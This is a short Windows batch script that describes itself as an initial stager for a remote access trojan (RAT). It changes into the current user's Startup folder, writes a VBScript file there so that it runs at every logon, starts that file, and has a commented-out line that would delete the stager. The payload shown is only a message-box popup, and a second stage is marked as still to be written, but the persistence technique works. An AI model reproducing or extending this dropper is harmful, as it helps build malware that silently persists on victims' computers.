@echo off
@REM initial stager for RAT

@REM varialbes
set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM move into startup directry
cd %STARTUP%

@REM TODO: build out stage two
@REM Write payloads to startup

(
    echo MsgBox "Line 1" ^& vbCrLf ^& "Line 2", 262192, "Title"
) > popup.vbs

@REM run payload
start popup.vbs

@REM cd back into initial Location
cd "%INITIALPATH%"
@REM del initial.cmd